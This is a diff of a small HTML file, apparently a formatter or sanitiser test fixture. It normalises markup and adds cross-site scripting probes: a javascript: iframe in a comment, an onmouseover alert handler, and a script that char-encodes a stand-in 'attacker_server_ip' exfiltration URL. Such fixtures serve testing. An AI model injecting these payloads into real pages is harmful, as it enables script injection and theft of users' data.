@@ -1,54 +1,25 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
   <head>
     <title>This is a title</title>
     <style>
       h1 {
-        color: red,
+        color: red;
       }
     </style>
   </head>
   <body>
     <h1>Hello</h1>
-    <p>
-      This is a paragraph.
-    </p>
-    <script>
-      const foo = 30
-      const foo = 30
-      const foo = 30
-    </script>
-
-    <h1>Hello</h1>
     <p>This is a paragraph.</p>
+    <!-- <iframe src=javascript:alert(1)> -->
+    <a onmouseover="alert(1)">test</a>
+    <br />
     <script>
-      const foo = 30
-      const foo = 30
-      const foo = 30
-    </script>
-    <h1>Hello</h1>
-
-    <p>This is a paragraph.</p>
-    <script>
-      const foo = 30
-      const foo = 30
-      const foo = 30
-    </script>
-
-    <h1>Hello</h1>
-    <p>This is a paragraph.</p>
-    <script>
-      const foo = 30
-      const foo = 30
-      const foo = 30
-    </script>
-
-    <h1>Hello</h1>
-    <p>This is a paragraph.</p>
-    <script>
-      const foo = 30
-      const foo = 30
-      const foo = 30
+      function ascii(c) {
+        return c.charCodeAt();
+      }
+      encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
+      document.write(encoded);
     </script>
   </body>
 </html>
